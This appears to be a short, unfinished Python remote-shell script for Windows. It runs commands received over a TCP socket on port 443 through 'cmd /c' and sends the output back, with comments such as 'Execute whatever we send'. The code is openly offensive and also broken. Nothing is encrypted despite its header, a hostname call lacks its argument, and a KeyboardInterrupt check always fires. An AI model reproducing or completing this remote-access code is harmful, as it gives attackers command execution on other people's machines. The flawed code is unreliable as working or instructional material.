# An Encrypted 
import socket 
import subprocess
import threading
import argparse


MAX_BUFFER = 4096
DEFAULT_PORT = 443
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP = socket.gethostbyaddr()

def execute_cmd(cmd):
    try:
        output = subprocess.check_output(f"cmd /c {cmd}")
    except:
        output = b"Command failed!"
    return output

print(execute_cmd("whoami").decode())

def decode_and_strip(s):
    return s.decode("utf-8").strip()

def shell_thread(sock):
    try:
        sock.send(f": ENTER COMMANDS TO EXECUTE : LocalIP_OF_Machine:[{IP}]") #I think im getting the hang outta this.

        while True:
            sock.send(b"\r\nEnter Command")
            
            data = sock.recv(MAX_BUFFER)
            if data:
                buffer = data.decode()

                if not buffer or buffer == "exit":
                    print("Exiting: ")
            if KeyboardInterrupt:
                print(b"Keyboard Interrupt: Exiting\r\n")
                break

            print(f"Executing Command: {buffer}") #Execute whatever we send., Then return the Output
            sock.send(execute_cmd(buffer))

    except ConnectionAbortedError:
        print("Connection aborted:")
    except ConnectionRefusedError:
        print("Connection blocked:")
    except ConnectionResetError:
        print("Connection Reset, Did the Firewall block you?, Or the Host close his Enddevice?")
    except ConnectionError:
        print("Connection Error:")
    except Exception as e:
        print(f"Unexpected Error: [{e}]")
